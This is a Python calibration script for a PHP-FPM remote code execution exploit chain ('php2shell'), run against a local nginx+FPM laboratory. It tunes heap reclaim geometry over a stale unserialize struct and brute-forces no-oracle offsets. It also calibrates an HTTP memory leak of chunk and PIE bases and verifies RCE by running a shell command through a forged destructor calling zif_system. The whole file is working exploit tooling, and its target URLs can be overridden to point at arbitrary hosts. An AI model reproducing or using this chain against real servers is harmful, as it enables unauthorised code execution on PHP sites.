#!/usr/bin/env python3
"""Calibrate an FPM profile against the local laboratory.

The calibration measures the version specific geometry of the chain and
writes it into ``profiles/<version>-fpm.json``:

* the struct layouts and symbols (via ``php2shell_fpm_profile.py``);
* the reclaim geometry: which pad field sizes place a controlled buffer over
  the stale ``BG(unserialize)`` struct, and at which content offset;
* the no-oracle candidates: the chunk-relative offsets of the two struct
  slots the recycled 8 KB allocation alternates between;
* the HTTP leak geometry: where the stale string and the base pointers live
  inside the leaked bytes.

A profile is only marked ``verified``/``rce`` when the primitive is
observable and the endgame produced a proof file.
"""

from __future__ import annotations

import argparse
import contextlib
import json
import os
import struct
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)

import php2shell_fpm as fpm  # noqa: E402
import php2shell_fpm_labs as labs  # noqa: E402
import php2shell_fpm_profile as profile_gen  # noqa: E402

# (pads, size) shapes tried for the reclaim buffer, most likely first.
RECLAIM_SHAPES = (
    ([4096, 4096, 4096], 12288),
    ([4096, 4096], 12288),
    ([4096, 4096, 4096], 16384),
    ([4096, 4096], 16384),
    ([4096], 12288),
    ([8192, 4096], 16384),
)

# (pads, size) shapes tried for the HTTP leak buffer.
LEAK_SHAPES = (
    ([32768, 16384], 16384),
    ([32768], 16384),
    ([16384, 32768], 16384),
    ([32768, 16384], 32768),
    ([65536, 32768], 32768),
)


def log(message: str) -> None:
    print(message, flush=True)


# --------------------------------------------------------------------------- #
# lab helpers
# --------------------------------------------------------------------------- #

def lab_urls(version: str) -> tuple[str, str]:
    builds = labs.builds_map([version] + list(labs.PINNED_PORTS))
    chain, builder, _c, _b = builds[version]
    return f"http://127.0.0.1:{chain}", f"http://127.0.0.1:{builder}"


def worker_running(version: str) -> bool:
    return fpm.find_pool_worker(version, "chain") is not None


def start_lab(version: str) -> None:
    if worker_running(version):
        return
    log(f"[*] starting the lab for {version}")
    labs.up({version})


def stop_lab() -> None:
    log("[*] stopping the lab")
    labs.down()


# --------------------------------------------------------------------------- #
# reclaim geometry
# --------------------------------------------------------------------------- #

def find_reclaim(base: str, builder: str, version: str, oracle: fpm.Oracle,
                 shapes=RECLAIM_SHAPES, need: int = 0x900):
    """Find a pad/size shape whose reclaim buffer covers the stale struct."""
    chain404 = fpm.Target(base + fpm.PATHS["probe"])
    for pads, size in shapes:
        if size < need + 0x1000:
            continue
        try:
            d = fpm._arm_stale(fpm.Target(base), fpm.Target(builder), oracle, 4 << 20)
            k = fpm._probe_cover(chain404, oracle, d, need, size, pads)
        except (RuntimeError, OSError) as exc:
            log(f"    pads={pads} size={size}: {exc}")
            continue
        if k is None:
            log(f"    pads={pads} size={size}: no cover")
            continue
        log(f"[+] reclaim shape pads={pads} size={size} k=0x{k:x} d=0x{d:x}")
        return pads, size, k, d
    return None


def collect_slots(base: str, builder: str, version: str, oracle: fpm.Oracle,
                  pads: list[int], size: int, rounds: int = 6):
    """Collect the (chunk offset, content offset) pairs of the struct slot."""
    chain404 = fpm.Target(base + fpm.PATHS["probe"])
    chainapp = fpm.Target(base + fpm.PATHS["app"])
    slots: list[tuple[int, int]] = []
    for _ in range(rounds):
        try:
            d = fpm._arm_stale(fpm.Target(base), fpm.Target(builder), oracle, 4 << 20)
            k = fpm._probe_cover(chain404, oracle, d, 0x900, size, pads)
            if k is None:
                continue
            chunk = oracle.chunk_base(d)
            if chunk is None:
                continue
            slot = (d - chunk, k)
            if slot not in slots:
                slots.append(slot)
        except (RuntimeError, OSError):
            continue
    return slots


# --------------------------------------------------------------------------- #
# verification
# --------------------------------------------------------------------------- #

def verify_primitive(base: str, builder: str, version: str, pads: list[int],
                     size: int, value: int = 1337337) -> bool:
    args = argparse.Namespace(
        base=base, builder=builder, version=version, size=4 << 20, value=value,
        reclaim_pads=pads, reclaim_size=size,
    )
    return fpm.cmd_primitive(args) == 0


def verify_endgame(base: str, builder: str, version: str, pads: list[int],
                   size: int, proof: str = "out/calib") -> bool:
    args = argparse.Namespace(
        base=base, builder=builder, version=version, size=4 << 20,
        command=f"id>{proof}", proof_file=proof,
        reclaim_pads=pads, reclaim_size=size,
    )
    return fpm.cmd_endgame(args) == 0


def brute_force_candidates(base: str, builder: str, version: str,
                           chunk: int, d_offs: list[int],
                           k_values: list[int] = (0xFE8, 0x1FE8, 0x2FE8),
                           limit: int = 24, pads: list[int] | None = None,
                           size: int = 16384) -> list[dict]:
    """Find the (d_off, k) pairs that make the no-oracle path fire.

    The reclaim buffer and the recycled struct slot move around the chunk,
    so the pairs are tried one by one until the proof file appears.
    """
    proof = "out/calib-nooracle"
    local = os.path.join(fpm.LAB, "webroot", proof)
    winners = []
    tried = 0
    for d_off in d_offs:
        for k in k_values:
            if tried >= limit:
                return winners
            tried += 1
            with contextlib.suppress(OSError):
                os.remove(local)
            args = argparse.Namespace(
                base=base, builder=builder, version=version, size=4 << 20,
                command=f"id>{proof}", proof_file=proof, chunk=chunk, pie=0,
                candidates=[(d_off, k)], allow_local_fallback=False,
                reclaim_size=size, reclaim_pads=pads,
            )
            try:
                fpm.cmd_no_oracle(args)
            except (RuntimeError, OSError) as exc:
                log(f"    candidate 0x{d_off:x}/0x{k:x}: {exc}")
                continue
            if os.path.isfile(local):
                log(f"[+] no-oracle candidate works: d_off=0x{d_off:x} k=0x{k:x}")
                winners.append({"d_off": hex(d_off), "k": hex(k)})
    return winners


# --------------------------------------------------------------------------- #
# HTTP leak geometry
# --------------------------------------------------------------------------- #

def stale_strings(oracle: fpm.Oracle, d: int, layout: dict):
    """Addresses of the stale k0/k1 strings (data[0] and data[1])."""
    uns = layout["unserialize_data"]
    ve = layout["var_entries"]
    out = []
    for index in (0, 1):
        try:
            zval_ptr = struct.unpack_from(
                "<Q", oracle.read(d + uns["entries"] + ve["data"] + 8 * index, 8))[0]
            value = struct.unpack_from("<Q", oracle.read(zval_ptr, 8))[0]
        except (OSError, struct.error):
            break
        out.append(value)
    return out


def find_leak_buffer(oracle: fpm.Oracle, chain404: fpm.Target, pads: list[int],
                     size: int, marker: bytes) -> list[int]:
    """Absolute addresses of the copies of the reclaim buffer in the chunk."""
    content = bytearray(size)
    content[0:8] = marker
    parts = [{"name": f"pad{i}", "data": b"C" * pad} for i, pad in enumerate(pads)]
    parts.append({"name": "big", "data": bytes(content)})
    chain404.post_multipart(parts, b"PRBUF01", timeout=120.0)
    oracle.refresh()
    chunk = fpm.next((s for s, e, p in oracle.maps
                      if "rw-p" in p and e - s == fpm.MEM_CHUNK), None)
    if chunk is None:
        return []
    try:
        mem = oracle.read(chunk, fpm.MEM_CHUNK)
    except OSError:
        return []
    found = []
    index = mem.find(marker)
    while index >= 0:
        found.append(chunk + index)
        index = mem.find(marker, index + 1)
    return found


def calibrate_leak(base: str, builder: str, version: str, oracle: fpm.Oracle,
                   layout: dict) -> dict | None:
    """Discover the HTTP leak geometry for a build."""
    chain = fpm.Target(base)
    app = fpm.Target(base + fpm.PATHS["app"])
    builder_t = fpm.Target(builder)
    chain404 = fpm.Target(base + fpm.PATHS["probe"])
    geom = fpm._leak_geometry(version) or {}

    for pads, size in LEAK_SHAPES:
        try:
            d = fpm._arm_stale(chain, builder_t, oracle, 4 << 20)
        except (RuntimeError, OSError) as exc:
            log(f"    leak shape pads={pads}: {exc}")
            continue
        k0, k1 = stale_strings(oracle, d, layout)
        if len(k0) < 2:
            log(f"    leak shape pads={pads}: stale strings not found")
            continue
        marker = b"LBK" + os.urandom(5)
        bases = find_leak_buffer(oracle, chain404, pads, size, marker)
        chunk = oracle.chunk_base(d)
        pie = oracle.pie_base
        log(f"    leak shape pads={pads} size={size}: k0=0x{k0[0]:x} "
            f"k1=0x{k0[1]:x} buffer copies={[hex(b) for b in bases]}")
        for base_addr in bases:
            header_off = k0[1] - base_addr
            if header_off < 0 or header_off > size - 0x200:
                continue
            geom_try = {
                "arm_path": geom.get("arm_path", "/bigvar.php"),
                "pads": pads,
                "size": size,
                "header_content_off": hex(header_off),
                "read_len": hex(0x30000),
                "chunk_ptr_off": "0x0",
                "chunk_base_off": "0x0",
                "pie_ptr_off": "0x0",
                "pie_base_off": "0x0",
            }
            found = probe_leak(base, builder, version, geom_try, oracle,
                               chunk, pie, k0[0])
            if found:
                geom_try.update(found)
                geom_try["read_len"] = hex(int(found["read_len"], 16))
                log(f"[+] leak geometry: header=0x{header_off:x} "
                    f"read_len={found['read_len']} "
                    f"chunk_ptr={found['chunk_ptr_off']} "
                    f"pie_ptr={found['pie_ptr_off']}")
                return geom_try
    return None


def probe_leak(base: str, builder: str, version: str, geom: dict,
               oracle: fpm.Oracle, chunk: int, pie: int, k0_addr: int) -> dict | None:
    """Run the leak with a candidate geometry and locate the base pointers."""
    chain = fpm.Target(base)
    app = fpm.Target(base + fpm.PATHS["app"])
    builder_t = fpm.Target(builder)
    size = geom["size"]
    read_len = int(geom["read_len"], 16)
    header = int(geom["header_content_off"], 16)
    content = bytearray(size)
    struct.pack_into("<I", content, header, 0x40000000)
    struct.pack_into("<I", content, header + 4, 6)
    struct.pack_into("<Q", content, header + 8, 0)
    struct.pack_into("<Q", content, header + 0x10, read_len)
    fill = min(read_len, size - header - 0x18)
    if fill > 0:
        content[header + 0x18:header + 0x18 + fill] = b"Q" * fill
    parts = [{"name": f"pad{i}", "data": b"C" * pad}
             for i, pad in enumerate(geom["pads"])]
    parts.append({"name": "big", "data": bytes(content)})
    parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
    parts.append({"name": "f", "filename": "a.txt", "data": b"x" * 8})

    for _attempt in range(3):
        with contextlib.suppress(OSError):
            fpm.ref_session_post(builder_t, fpm.REF_SID)
            app.get(fpm.PATHS["app"], cookie=fpm._cookie(fpm.REF_SID))
        try:
            builder_t.get(geom["arm_path"], cookie=fpm._cookie(fpm.OOM_SID))
            chain.get(fpm.PATHS["app"], cookie=fpm._cookie(fpm.OOM_SID))
            fpm.ref_session_post(builder_t, fpm.REF_SID)
            _status, _headers, body = app.post_multipart(
                parts, b"CALLEAK", cookie=fpm._cookie(fpm.REF_SID), timeout=180.0)
        except (OSError, RuntimeError):
            continue
        raw = fpm._dechunk(body)
        index = raw.find(b"r\t")
        if index < 0:
            continue
        read = raw[index + 2:index + 2 + read_len]
        if len(read) < 0x1000:
            continue
        chunk_ptr_off = None
        pie_ptr_off = None
        chunk_base_off = None
        pie_base_off = None
        for off in range(0, len(read) - 8, 8):
            value = struct.unpack_from("<Q", read, off)[0]
            if chunk_ptr_off is None and value == k0_addr:
                chunk_ptr_off = off
                chunk_base_off = k0_addr - chunk
            if pie_ptr_off is None and pie <= value < pie + 0x1000000:
                pie_ptr_off = off
                pie_base_off = value - pie
        if chunk_ptr_off is None or pie_ptr_off is None:
            continue
        return {
            "chunk_ptr_off": hex(chunk_ptr_off),
            "chunk_base_off": hex(chunk_base_off),
            "pie_ptr_off": hex(pie_ptr_off),
            "pie_base_off": hex(pie_base_off),
            "read_len": hex(read_len),
        }
    return None


# --------------------------------------------------------------------------- #
# driver
# --------------------------------------------------------------------------- #

def calibrate(version: str, base: str, builder: str, update: bool,
              leak: bool, keep_lab: bool) -> int:
    log(f"=== calibrating PHP {version} ===")
    prefix = profile_gen.prefix_for(version)
    if not os.path.isfile(os.path.join(prefix, "sbin", "php-fpm")):
        log(f"[!] {version} is not built")
        return 1

    profile_path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
    template_path = os.path.join(ROOT, "profiles", "8.4.26-fpm.json")
    if not os.path.isfile(template_path):
        template_path = profile_path
    try:
        result = profile_gen.generate(version, template_path, profile_path,
                                      "debian", "amd64", None, True)
    except (OSError, RuntimeError, ValueError) as exc:
        log(f"[!] profile generation failed: {exc}")
        return 1
    profile = result["profile"]
    layout = result["layout"]

    start_lab(version)
    time.sleep(0.5)
    try:
        oracle = fpm.Oracle(version, "chain")
    except RuntimeError as exc:
        log(f"[!] {exc}")
        stop_lab()
        return 1

    found = find_reclaim(base, builder, version, oracle)
    if not found:
        log("[!] no reclaim geometry found")
        stop_lab()
        return 1
    pads, size, k, d = found

    slots = collect_slots(base, builder, version, oracle, pads, size)
    log(f"[*] struct slots: {[(hex(a), hex(b)) for a, b in slots]}")
    chunk = oracle.chunk_base(d)
    candidates = [{"d_off": hex(off), "k": hex(content)}
                  for off, content in slots]

    # The no-oracle path uses a bigger reclaim buffer, so its content offset
    # is measured separately.
    no_oracle_size = 16384

    profile["fpm"]["reclaim_pads"] = pads
    profile["fpm"]["reclaim_size"] = size
    profile["fpm"]["no_oracle"]["reclaim_pads"] = pads
    profile["fpm"]["no_oracle"]["reclaim_size"] = no_oracle_size
    profile["fpm"]["no_oracle"]["candidates"] = candidates or [
        {"d_off": hex(d - chunk), "k": hex(k)}]

    no_oracle_slots = collect_slots(base, builder, version, oracle, pads,
                                    no_oracle_size)
    log(f"[*] no-oracle slots: {[(hex(a), hex(b)) for a, b in no_oracle_slots]}")
    if no_oracle_slots:
        profile["fpm"]["no_oracle"]["candidates"] = [
            {"d_off": hex(off), "k": hex(content)} for off, content in no_oracle_slots]

    log("[*] primitive check ...")
    primitive_ok = verify_primitive(base, builder, version, pads, size)
    log("[*] endgame check ...")
    rce_ok = verify_endgame(base, builder, version, pads, size)

    # The no-oracle path uses a different buffer size, so its (d_off, k)
    # pairs have to be measured separately: brute force them over the slots
    # the recycled struct alternates between.
    no_oracle_candidates = []
    if rce_ok:
        log("[*] no-oracle candidate search ...")
        chunk = oracle.chunk_base(d)
        offsets = sorted({off for off, _k in no_oracle_slots} |
                         {off for off, _k in slots})
        try:
            pie, chunk = fpm.leak_bases_http(base, builder, version)
        except (OSError, RuntimeError) as exc:
            log(f"    HTTP leak failed: {exc}")
            pie, chunk = oracle.pie_base, chunk
        no_oracle_candidates = brute_force_candidates(
            base, builder, version, chunk, offsets, pads=pads,
            size=no_oracle_size)
        if no_oracle_candidates:
            profile["fpm"]["no_oracle"]["candidates"] = no_oracle_candidates

    leak_geom = None
    if leak:
        log("[*] leak calibration ...")
        leak_geom = calibrate_leak(base, builder, version, oracle, layout)
        if leak_geom:
            profile["fpm"]["leak"] = leak_geom

    profile["verified"] = bool(primitive_ok and rce_ok)
    profile["rce"] = bool(rce_ok)
    status = (f"RCE verified in the nginx+FPM lab: the reclaim geometry "
              f"pads={pads} size={size} covers the stale BG(unserialize) "
              f"struct and the forged HashTable destructor fires zif_system.")
    if leak_geom:
        status += (" The HTTP stale-string leak recovers the chunk and PIE "
                   "bases with this build's offsets.")
    profile["status"] = status

    if update:
        profile_gen.dump_json(profile, profile_path)
        log(f"[+] wrote {profile_path}")

    log(f"[=] {version}: primitive={'ok' if primitive_ok else 'FAIL'} "
        f"rce={'ok' if rce_ok else 'FAIL'} leak={'ok' if leak_geom else 'no'}")
    if not keep_lab:
        stop_lab()
    return 0 if (primitive_ok and rce_ok) else 1


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--version", required=True)
    parser.add_argument("--base", default=None)
    parser.add_argument("--builder", default=None)
    parser.add_argument("--update", action="store_true",
                        help="write the calibrated profile to profiles/")
    parser.add_argument("--leak", action="store_true",
                        help="also calibrate the HTTP leak geometry")
    parser.add_argument("--keep-lab", action="store_true",
                        help="leave the laboratory running")
    args = parser.parse_args()

    base, builder = lab_urls(args.version)
    if args.base:
        base = args.base
    if args.builder:
        builder = args.builder
    return calibrate(args.version, base, builder, args.update, args.leak,
                     args.keep_lab)


if __name__ == "__main__":
    sys.exit(main())
